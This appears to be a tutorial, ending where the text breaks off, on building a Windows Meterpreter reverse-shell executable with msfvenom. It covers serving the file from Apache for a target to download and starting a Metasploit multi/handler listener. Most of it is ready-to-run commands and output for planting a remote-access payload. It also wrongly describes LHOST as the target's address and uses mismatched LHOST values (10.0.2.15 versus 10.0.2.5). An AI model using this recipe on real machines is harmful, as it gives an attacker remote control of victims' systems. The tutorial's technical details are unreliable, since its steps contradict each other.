# Generating a basic payloading using msfvenom
![image](https://user-images.githubusercontent.com/72777943/208308869-fd1276ae-e636-4d74-902d-90878387d0cc.png)

# Using msfvenom to generate the payload 
To begin we will run msfvenoms help command to see what we are able to do.
```
┌──(kali㉿kali)-[~]
└─$ msfvenom -h                                                                                    
MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --service-name    <value>    The service name to use when generating a service binary
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message
```

Now that we have a list of what msfvenom and offer, let us begin generating our first payload.
We will start off by typing out the following command:
```
┌──(kali㉿kali)-[~]
└─$ msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=5555 -f exe -o shell.exe
```

To understand this further let me explain. We use the `-p` option to tell msfvenom what payload we want to us, then we need to specify which `LHOST` and `LPORT` we are targeting, which in this case it would be or targets machine.
Once this is done we use the `-f` option to specify the filetype and `-o` for the files name.

Now we our payload and options entered, we can proceed to generating our payload. To do this we can simply press enter and msfvenom will do the rest of the work for us.
```
┌──(kali㉿kali)-[~]
└─$ msfvenom  -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.15 LPORT=5555 -f exe -o shell.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: shell.exe
```
# Transfer The Payload

With the payload generated we must now get this onto our targets machine. We can do this by simple dragging the file onto the targets machine (if you are running on a virtual machine),
or if you are unable to do this, you can move your payload into the `/var/www/html/` folder and start your apache2 service and have the targets machine download the file from your website.

Below is a example to do this. 

Firstly we move the file into the correct folder.

$ `mv shell.exe /var/www/html/`

Next we will start up our apache2 service.

$ `sudo service apache2 start`

On the targets machine, we must go visit our website and download the file :: [http://ip/shell.exe]()

# Time To Listen In

Now with our payload in place it is time to listen in on that port in order for the target to connect back to us.
We will now start up our msfconsole and use `exploit/multi/handler`.
```
┌──(kali㉿kali)-[~]
└─$ msfconsole                                                                                                                                      
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.1.39-dev                          ]
+ -- --=[ 2214 exploits - 1171 auxiliary - 396 post       ]
+ -- --=[ 616 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Start commands with a space to avoid saving 
them to history

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
```
*Note* : `exploit/mutli/handler` is not an exploit but used more as a listener for incoming connections.

If we run our `show options` command, we can see that we need to set our `payload`.

**This payload must match the payload that the target will execute.**

We must also set our `LPORT` and `LHOSTS`.

To do this we will run the follow commands:
```
msf6 exploit(multi/handler) > set LHOST 10.0.2.5
LHOST => 10.0.2.5
msf6 exploit(multi/handler) > set LPORT 5555
LPORT => 5555
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
```
Perfect, now we everything set, let us run the `show options` command one more time to ensure all of our options are correct.
```
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.5         yes       The listen address (an interface may be specified)
   LPORT     5555             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target
```

Now with that all done, we can move on to running it. 
```
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.0.2.5:5555 
```

As we can see above, our console is only listening for a connection right now with nothing else happening because the shell has not been run yet on our targets system.

# Run That Shell!
Once the shell has been executed we will see the following output on our console:



